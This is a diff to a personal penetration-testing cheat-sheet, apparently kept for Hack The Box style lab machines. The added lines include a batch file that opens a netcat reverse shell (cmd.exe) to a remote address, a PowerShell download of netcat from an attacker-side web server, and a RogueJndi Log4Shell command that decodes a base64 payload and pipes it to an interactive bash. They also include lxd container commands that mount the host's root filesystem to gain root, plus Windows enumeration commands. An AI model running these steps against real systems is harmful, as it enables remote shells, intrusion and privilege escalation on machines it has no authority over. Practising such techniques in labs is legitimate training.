@@ -19,8 +19,13 @@ n : Numeric-only IP address. No hostname resolution. DNS is not being used.
 p : Port. Use to specify a particular port for listening
 netCat for windows:
  "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe" 
+ echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.14.180 1234 > C:\Log-Management\job.bat
+ 
 Monitor local tcp ports:
 sudo tcpdump -i tun0 port 389
+
+python simple web server:
+python3 -m http.server 80
 
 make new password hash:
 mkpasswd -m sha-512 Password1234
@@ -87,8 +92,14 @@ rogue-jndi Java application, which starts a local LDAP server
 The spaces here are super important!!
 java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}|{base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"
 
-windows console history:
-C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
+WINDOWS:
+    windows console history:
+    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
+CMD:
+whoami /priv
+icacls file  << this show permissions on files
+schtasks   <<< show auto tasks in for pc 
+
 Availabel Users:
 cat /etc/passwd
 
@@ -139,7 +150,11 @@ Server Side Template Injection vulnerability Example injection:
  {{/with}}
 {{/with}}
 
-
+lxd lxc commnds:
+lxc init alpine privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc /bin/sh
 
 Usefull Links:
 ============
@@ -162,3 +177,5 @@ Parrot OS, it is possible to find webshells under the folder /usr/share/webshell
 Read through this https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-methodology.html
 Log4J:
 https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation
+windows Netcat
+https://github.com/rahuldottech/netcat-for-windows/releases/download/1.12/nc64.exe
